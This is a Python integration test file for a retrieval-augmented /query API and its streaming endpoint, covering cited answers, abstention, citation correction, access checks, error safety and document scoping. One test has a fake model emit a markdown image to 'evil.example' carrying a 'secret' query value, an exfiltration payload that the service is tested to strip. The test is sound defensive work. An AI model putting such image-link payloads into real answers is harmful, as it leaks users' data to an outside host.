# ruff: noqa: F811  (fixtures imported from test_ingestion_stages)
"""`/query` and its SSE stream (T5.3/T5.4, S28-S29) through the real HTTP stack, the PostgreSQL
search backend, the fake embedder and reranker, and scripted or extractive fake models."""

import json
import uuid
from collections.abc import Sequence
from typing import Any

import asyncpg
import pytest

from app.api.dependencies.query import get_query_deps
from app.api.errors import ServiceUnavailable
from app.providers.llm.base import ChatMessage, GenerationParams, LLMResult, LLMUnavailableError
from app.providers.llm.fake import FakeLLM
from app.providers.rerankers.fake import FakeReranker
from app.providers.search.postgres import PostgresSearchBackend
from app.rag.orchestration.generation import (
    ExtractiveFakeLLM,
    Generator,
    PolicyView,
    message_counter,
)
from app.services.query import QueryDeps
from app.services.search import SearchDeps
from tests.fakes import FakeEmbeddingProvider
from tests.test_indexing import POLICY
from tests.test_ingestion_ops import join_as
from tests.test_ingestion_stages import (  # noqa: F401 (pytest fixtures)
    World,
    admin,
    app,
    store,
    world,
)
from tests.test_search_api import ready

pytestmark = pytest.mark.integration


def use_query(world: World, provider: Any, **settings: Any) -> list[PolicyView]:
    """Search as in test_search_api plus a fixed model; returns the policies it was asked for."""
    configured = world.settings.model_copy(update=settings)
    policies: list[PolicyView] = []

    def generator_for(policy: PolicyView) -> Generator:
        policies.append(policy)
        return Generator(
            provider, message_counter(lambda t: len(t.split())), GenerationParams(), 6000
        )

    world.app.dependency_overrides[get_query_deps] = lambda: QueryDeps(
        search=SearchDeps(
            backend=PostgresSearchBackend(world.app.state.sessionmaker),
            embedder=FakeEmbeddingProvider(),
            settings=configured,
            reranker=FakeReranker(),
            count_tokens=lambda t: len(t.split()),
        ),
        generator_for=generator_for,
    )
    return policies


async def ask(world: World, question: str, who: str = "alice", stream: bool = False) -> Any:
    path = f"/v1/knowledge-bases/{world.kb}/query" + ("/stream" if stream else "")
    return await world.api.post(path, json={"question": question}, headers=world.h(who))


def frames(body: str) -> list[tuple[str, Any]]:
    events = []
    for block in body.strip().split("\n\n"):
        lines = block.split("\n")
        if lines[0].startswith(":"):
            continue
        name = lines[0].removeprefix("event: ")
        events.append((name, json.loads(lines[1].removeprefix("data: "))))
    return events


async def test_a_grounded_answer_cites_only_retrieved_sources_and_is_persisted(
    world: World, admin: asyncpg.Connection
) -> None:
    use_query(world, ExtractiveFakeLLM())
    await ready(world, POLICY, "parental-leave.md")

    response = await ask(world, "How many weeks of parental leave under HR-142-B?")

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["abstained"] is False
    assert body["evidence_status"] == "strong"
    assert body["citations"]
    assert body["citations"][0]["alias"] == "S1"
    assert {c["chunk_id"] for c in body["citations"]} <= {s["chunk_id"] for s in body["sources"]}
    assert "[S1]" in body["answer_markdown"]

    run = uuid.UUID(body["query_run_id"])
    row = await admin.fetchrow("SELECT * FROM query_runs WHERE id = $1", run)
    assert (row["query_type"], row["status"]) == ("ask", "completed")
    assert row["query_text"] is None  # retention off
    assert row["generation_model"] == ExtractiveFakeLLM.model_id
    assert row["reranker_model"] == FakeReranker.model_id
    answer = await admin.fetchrow("SELECT * FROM answers WHERE query_run_id = $1", run)
    assert (answer["abstained"], answer["evidence_status"]) == (False, "strong")
    cited = await admin.fetch(
        "SELECT source_alias, chunk_id FROM citations WHERE answer_id = $1", answer["id"]
    )
    assert [r["source_alias"] for r in cited] == ["S1"]
    selected = await admin.fetchval(
        "SELECT count(*) FROM retrieval_hits WHERE query_run_id = $1 AND selected_for_context", run
    )
    assert selected >= 1
    assert str(cited[0]["chunk_id"]) in {s["chunk_id"] for s in body["sources"]}


async def test_no_evidence_abstains_without_calling_the_model(
    world: World, admin: asyncpg.Connection
) -> None:
    model = FakeLLM([])  # any call would fail the test: the script is empty
    use_query(world, model)  # the KB has no documents

    body = (await ask(world, "What is the travel policy?")).json()

    assert body["abstained"] is True
    assert body["abstain_reason"] == "no_evidence"
    assert body["evidence_status"] == "insufficient"
    assert body["sources"] == []
    assert body["citations"] == []
    assert model.calls == []
    run = uuid.UUID(body["query_run_id"])
    answer = await admin.fetchrow("SELECT abstained FROM answers WHERE query_run_id = $1", run)
    assert answer["abstained"] is True
    status = await admin.fetchval("SELECT status FROM query_runs WHERE id = $1", run)
    assert status == "abstained"


async def test_invalid_citations_get_one_correction_then_fail_safe(
    world: World, admin: asyncpg.Connection
) -> None:
    model = FakeLLM(["Leave is sixteen weeks. [S9]", "Leave is sixteen weeks. [S7]"])
    use_query(world, model)
    await ready(world, POLICY, "parental-leave.md")

    body = (await ask(world, "How long is parental leave?")).json()

    assert body["abstained"] is True
    assert body["abstain_reason"] == "invalid_citations"
    assert "[S9]" not in body["answer_markdown"]
    assert "[S7]" not in body["answer_markdown"]
    assert body["citations"] == []
    assert body["sources"]  # the closest authorized sources are still offered
    assert len(model.calls) == 2  # exactly one bounded correction
    count = await admin.fetchval(
        "SELECT count(*) FROM citations c JOIN answers a ON a.id = c.answer_id "
        "WHERE a.query_run_id = $1",
        uuid.UUID(body["query_run_id"]),
    )
    assert count == 0


async def test_answers_never_carry_links_or_images(world: World) -> None:
    model = FakeLLM(
        [
            "Leave is sixteen weeks [S1]. ![x](https://evil.example/c?d=secret)",
            "Leave is sixteen weeks [S1].",
        ]
    )
    use_query(world, model)
    await ready(world, POLICY, "parental-leave.md")

    body = (await ask(world, "How long is parental leave?")).json()

    assert body["abstained"] is False
    assert "evil.example" not in body["answer_markdown"]
    assert body["answer_markdown"] == "Leave is sixteen weeks [S1]."


async def test_the_stream_follows_the_contract_with_no_transaction_open_while_generating(
    world: World, admin: asyncpg.Connection
) -> None:
    open_transactions: list[int] = []

    class Probe(ExtractiveFakeLLM):
        async def generate(
            self, messages: Sequence[ChatMessage], params: GenerationParams | None = None
        ) -> LLMResult:
            open_transactions.append(
                await admin.fetchval(
                    "SELECT count(*) FROM pg_stat_activity WHERE pid <> pg_backend_pid() "
                    "AND datname = current_database() AND state LIKE 'idle in transaction%'"
                )
            )
            return await super().generate(messages, params)

    use_query(world, Probe())
    await ready(world, POLICY, "parental-leave.md")

    response = await ask(world, "How many weeks of parental leave?", stream=True)

    assert response.status_code == 200, response.text
    assert response.headers["content-type"].startswith("text/event-stream")
    events = frames(response.text)
    names = [name for name, _ in events]
    assert names[0] == "meta"
    assert names[-1] == "done"
    stages = [data["stage"] for name, data in events if name == "stage"]
    assert stages == [
        "retrieval.started",
        "retrieval.completed",
        "rerank.started",
        "rerank.completed",
        "generation.started",
    ]
    assert names.index("sources") < names.index("answer_delta") < names.index("citation")
    meta, done = events[0][1], events[-1][1]
    text = "".join(data["text"] for name, data in events if name == "answer_delta")
    assert "[S1]" in text
    assert done["abstained"] is False
    assert done["conflicts"] == []
    assert open_transactions == [0]  # the request's transaction was closed before generation
    status = await admin.fetchval(
        "SELECT status FROM query_runs WHERE id = $1", uuid.UUID(meta["query_run_id"])
    )
    assert status == "completed"


async def test_generation_failures_are_safe_errors_and_failed_runs(
    world: World, admin: asyncpg.Connection
) -> None:
    use_query(world, FakeLLM([LLMUnavailableError("upstream said: secret-detail")] * 2))
    await ready(world, POLICY, "parental-leave.md")

    streamed = await ask(world, "How long is parental leave?", stream=True)
    plain = await ask(world, "How long is parental leave?")

    name, data = frames(streamed.text)[-1]
    assert (name, data["code"]) == ("error", "generation_failed")
    assert "secret-detail" not in streamed.text
    assert plain.status_code == 503
    assert plain.json()["error"]["code"] == "generation_failed"
    assert "secret-detail" not in plain.text
    statuses = await admin.fetch(
        "SELECT status FROM query_runs WHERE query_type = 'ask' AND organization_id = $1",
        uuid.UUID(world.org),
    )
    assert [r["status"] for r in statuses] == ["failed", "failed"]


async def test_query_access_matches_search_and_unconfigured_generation_is_503(
    world: World, admin: asyncpg.Connection
) -> None:
    use_query(world, ExtractiveFakeLLM())
    await ready(world, POLICY, "parental-leave.md")
    await join_as(world, "bob", "member")
    alice = (await world.api.get("/v1/me", headers=world.h())).json()["user"]["id"]
    entries = [{"principal_type": "user", "principal_id": alice, "permission": "manage"}]
    await world.api.put(
        f"/v1/knowledge-bases/{world.kb}/permissions", json={"entries": entries}, headers=world.h()
    )
    await world.api.patch(
        f"/v1/knowledge-bases/{world.kb}", json={"visibility": "restricted"}, headers=world.h()
    )

    assert (await ask(world, "parental leave", who="bob")).status_code == 404
    unknown = await world.api.post(
        f"/v1/knowledge-bases/{uuid.uuid4()}/query",
        json={"question": "leave"},
        headers=world.h(),
    )
    assert unknown.status_code == 404

    def unavailable(policy: PolicyView) -> Generator:
        raise ServiceUnavailable("Answer generation isn't configured.")

    deps = world.app.dependency_overrides[get_query_deps]()
    world.app.dependency_overrides[get_query_deps] = lambda: QueryDeps(deps.search, unavailable)
    before = await admin.fetchval("SELECT count(*) FROM query_runs")
    response = await ask(world, "parental leave", stream=True)
    assert response.status_code == 503
    assert response.headers["content-type"].startswith("application/json")
    assert await admin.fetchval("SELECT count(*) FROM query_runs") == before


async def test_document_scope_never_widens_the_search(world: World) -> None:
    use_query(world, ExtractiveFakeLLM())
    policy = await ready(world, POLICY, "parental-leave.md")

    disjoint = await world.api.post(
        f"/v1/knowledge-bases/{world.kb}/query",
        json={
            "question": "parental leave",
            "scope": {"document_ids": [policy["document_id"]]},
            "filters": {"document_ids": [str(uuid.uuid4())]},
        },
        headers=world.h(),
    )
    scoped = await world.api.post(
        f"/v1/knowledge-bases/{world.kb}/query",
        json={"question": "parental leave", "scope": {"document_ids": [policy["document_id"]]}},
        headers=world.h(),
    )

    assert disjoint.json()["abstain_reason"] == "no_evidence"
    assert scoped.json()["abstained"] is False
